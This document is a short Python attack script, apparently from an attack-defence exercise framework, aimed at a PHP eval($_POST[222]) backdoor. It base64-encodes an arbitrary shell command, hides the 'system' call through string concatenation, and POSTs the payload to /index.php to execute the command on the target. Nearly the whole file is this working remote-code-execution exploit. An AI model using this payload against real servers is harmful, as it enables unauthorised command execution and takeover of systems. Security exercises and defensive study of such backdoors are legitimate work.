#!/usr/bin/env python

from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback

def vulnerable_attack(target,target_port,cmd):
        
    '''
    this is the payload script for vuln:

    eval($_POST[222]);

    '''
    
    try:           
        cmd = base64.b64encode(cmd)
        payload = "$a='sy'.'stem';$b = '%s';$a(base64_decode($b));"%cmd
        data = '222=%s'% quote(payload) 
        res = http("post",target,target_port,"/index.php",data,headers)
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res




